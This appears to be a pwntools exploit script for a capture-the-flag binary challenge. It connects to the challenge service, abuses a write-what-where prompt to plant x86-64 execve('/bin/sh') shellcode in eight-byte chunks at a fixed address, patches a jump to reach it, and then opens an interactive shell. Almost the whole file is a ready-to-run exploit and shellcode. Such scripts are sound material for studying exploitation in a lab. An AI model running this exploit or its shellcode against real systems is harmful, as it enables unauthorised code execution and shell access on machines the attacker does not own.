import argparse

from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

# r = process(['./challenge'])
# gdb.attach(r, f'''
# c
# ''')

def splitN(a,n):
	"""
	splitN takes an array [1, 2, 3, 4, 5, 6] and gives you [[1, 2], [3, 4], [5, 6]]
	"""
	import math
	return [a[i*n:(i+1)*n] for i in range(math.ceil(len(a)/n))]


sc = b'\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

for i, b in enumerate(splitN(sc, 8)):
	print(i, b)
	r.sendlineafter(b'Where to write? (hex)', hex(0x4011dd + (i * 8))[2:])
	r.sendlineafter(b'What to write? (hex)', hex(u64(b.ljust(8, b'\x00')))[2:])
	r.sendlineafter(b'Do another?', b'1');

r.sendlineafter(b'Where to write? (hex)', hex(0x4012ca)[2:])
r.sendlineafter(b'What to write? (hex)', hex(0xffffff0ee9)[2:])
r.sendlineafter(b'Do another?', b'0');

r.interactive()